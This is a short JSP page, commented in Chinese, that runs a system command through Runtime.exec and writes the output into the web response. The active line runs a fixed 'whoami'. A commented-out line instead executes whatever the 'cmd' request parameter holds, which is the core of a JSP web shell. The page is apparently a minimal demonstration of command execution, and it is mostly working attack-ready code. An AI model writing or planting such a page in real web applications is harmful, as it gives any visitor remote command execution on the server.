<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>

<%

	// 获取Runtime对象
	Runtime runtime = Runtime.getRuntime();

// 执行系统命令
	Process process = runtime.exec("whoami");
//Process process = runtime.exec(request.getParameter("cmd"));

// 获取进程的输入流，并将其转换为BufferedReader
	InputStream inputStream = process.getInputStream();
	BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

// 读取命令的输出
	String line;
	while ((line = reader.readLine()) != null) {
		out.println(line + "<br>");
	}

%>
